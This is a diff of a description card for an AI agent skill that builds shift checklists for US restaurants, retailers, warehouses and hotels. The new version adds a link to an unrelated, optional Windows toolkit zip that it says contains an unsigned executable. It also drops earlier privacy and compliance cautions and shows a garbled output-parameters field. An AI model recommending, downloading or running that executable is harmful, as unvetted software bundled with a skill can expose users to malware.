@@ -1,6 +1,6 @@
 ## Description:
 
-Builds an accessible daily opening, shift and closing checklist for US front-of-house teams, with sign-off lines and state items.
+Builds an accessible daily opening, shift and closing checklist for US front-of-house teams, with sign-off lines and state items. Use when the user asks for daily checklist template, opening and closing checklist, shift handoff checklist. For US restaurant, retail, warehouse and hotel shift leads who run opening and closing checklists.
 
 This skill is ready for commercial/non-commercial use.
 
@@ -14,7 +14,7 @@ MIT-0
 
 ## Use Case:
 
-US restaurant, retail, warehouse, and hotel shift leads use this skill to create accessible opening, mid-shift, closing, and sign-off checklists with state- or city-specific items.
+US restaurant, retail, warehouse, and hotel shift leads use this skill to turn site details and local requirements into accessible opening, mid-shift, and closing checklists with clear checks and sign-off fields.
 
 ### Deployment Geography for Use:
 
@@ -22,41 +22,35 @@ United States
 
 ## Known Risks and Mitigations:
 
-Risk: Shared checklists could expose customer or payment details.
+Risk: ClawScan flags file-writing capability without a declared tool scope, and reports incomplete coverage because five local references could not be resolved.
 
-Mitigation: Keep customer names, phone numbers, order numbers, and payment card details off shared checklists; use counts or placeholders.
+Mitigation: Before installing, review whether the declared tool scope and file-writing capability are clear and appropriate, and inspect the unresolved references.
 
-Risk: Local requirements vary, and checklist sign-off does not certify compliance.
+Risk: The optional, separately downloaded Windows toolkit contains an unsigned executable.
 
-Mitigation: Verify site-specific requirements with the applicable state, city, or health authority, and do not present the checklist as compliance certification.
-
-Risk: The lint tool overwrites an existing lint-report.md in its output directory.
-
-Mitigation: Choose a dedicated output directory before running the tool.
-
-Risk: The optional Windows app is a separate download and was not assessed by the security verdict.
-
-Mitigation: Make a separate trust decision before downloading or running it, and verify its published SHA-256 hash first.
+Mitigation: Verify the archive SHA-256 against the value in the skill, run it only if you accept unsigned software, and avoid administrator privileges unless needed.
 
 ## Reference(s):
 
-- [ClawHub skill release](https://clawhub.ai/rapidworker1/skills/daily-checklist-builder)
+- [Accessible checklist rules](references/accessible-checklist-rules.md)
+- [Daily Checklist Builder on ClawHub](https://clawhub.ai/rapidworker1/skills/daily-checklist-builder)
 - [Publisher profile](https://clawhub.ai/user/rapidworker1)
 - [Publisher homepage](https://github.com/rapidworker1)
+- [Optional Windows Multi-Tool download](https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip)
 
 ## Skill Output:
 
-**Output Type(s):** [text, markdown, guidance]
+**Output Type(s):** [Markdown, Guidance, Files]
 
-**Output Format:** [A daily checklist with opening, mid-shift, closing, and sign-off sections, plus supporting notes.]
+**Output Format:** [Markdown checklist with opening, mid-shift, closing, and sign-off sections; step rewrites, state-specific items, accessibility notes, and an optional Markdown lint report.]
 
-**Output Parameters:** [Site type, opening and closing times, equipment, state or city, checklist tasks, and print preferences.]
+**Output Parameters:** [1D]
 
-**Other Properties Related to Output:** [Includes clear step rewrites, local items with sources to confirm, accessibility and print notes, and sign-off fields; it is not a compliance certification.]
+**Other Properties Related to Output:** [Checklist steps name the check and expected result; state-dependent steps identify a source to confirm.]
 
 ## Skill Version(s):
 
-1.0.6 (source: server-resolved release)
+1.0.7 (source: SKILL.md frontmatter and server-resolved release metadata)
 
 ## Ethical Considerations:
 
